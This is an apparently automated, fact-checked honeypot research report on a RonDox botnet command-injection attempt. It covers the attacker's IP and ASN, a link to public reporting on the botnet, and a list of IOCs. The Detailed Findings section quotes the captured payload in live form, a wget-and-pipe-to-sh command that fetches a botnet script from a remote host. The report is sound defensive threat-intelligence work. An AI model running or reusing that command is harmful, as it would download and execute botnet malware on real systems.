**Fact-Checked Honeypot Research Report: RonDox Botnet**

**Report Generation Time:** 2025-11-02T17:25:14.802567Z
**Fact-Checked Time:** 2025-11-02T17:29:51.482911Z
**Investigation Timeframe:** 2025-09-28T00:00:00.000Z to 2025-10-28T23:59:59.999Z
**Data Source:** Honeypot Network Elasticstack Logs

**Executive Summary**
This report provides a fact-checked analysis of an attempted infection by the RonDox botnet. While the specific CVEs provided in the initial request (CVE-2024-3721, CVE-2024-12856, CVE-2023-1389) were not found in alert logs, a confirmed Indicator of Compromise (IOC) for the RonDox botnet was detected. The incident involved a command injection attempt to download and execute the malicious script "rondo.whm.sh". Open-source intelligence confirms this is a primary TTP of the RonDox botnet. The attacker's IP and associated intelligence have been verified against logs from the correct date and time.

**Detailed Findings**
On **2025-10-26 at 23:40:23.027Z**, a Suricata `fileinfo` event was logged on the `sens-tel` honeypot (34.165.197.224). The log captured a command injection payload attempting to use `wget` to download and execute a shell script from a remote server:

`wget -qO- http://74.191.191.52/rondo.whm.sh | sh`

This technique is a hallmark of botnet propagation. The filename "rondo.whm.sh" is a known IOC for the RonDox botnet. No evidence of the second fingerprint, "rondo.dtm.sh", was found within the specified timeframe.

**Attacker Intelligence (Verified)**
The log record for the event contains the external IP `124.198.131.83`. Subsequent verification confirms this IP was the source of other attacks against the same honeypot on the same day. The verified intelligence for this IP is as follows:
*   **IP Address:** 124.198.131.83
*   **ASN:** 210558
*   **AS Organization:** 1337 Services GmbH
*   **Geolocation:** New York, United States

**Open-Source Intelligence Correlation**
Public reporting on the RonDox botnet aligns with the observed activity:
*   **Primary Attack Vector:** RonDox is known to use command injection vulnerabilities as a primary means of propagation.
*   **CVE Link:** While not present in our logs, security researchers have linked RonDox campaigns to the exploitation of CVE-2023-1389 (a command injection flaw). The observed TTP is consistent with this type of vulnerability.
*   **Botnet Activities:** RonDox is primarily leveraged for DDoS attacks.

**Conclusion**
There is conclusive evidence that the RonDox botnet targeted the `sens-tel` honeypot on October 26, 2025. The detection of the "rondo.whm.sh" fingerprint within a command injection attack confirms that our network was a target of this threat actor. The absence of specific CVE alerts does not diminish the finding, as the malicious activity and IOCs were successfully identified and have been verified.

**Indicators of Compromise (IOCs)**
*   **Attacker IP:** 124.198.131.83
*   **Malware URL:** `hxxp://74.191.191.52/rondo.whm.sh`
*   **Malware Filename:** rondo.whm.sh
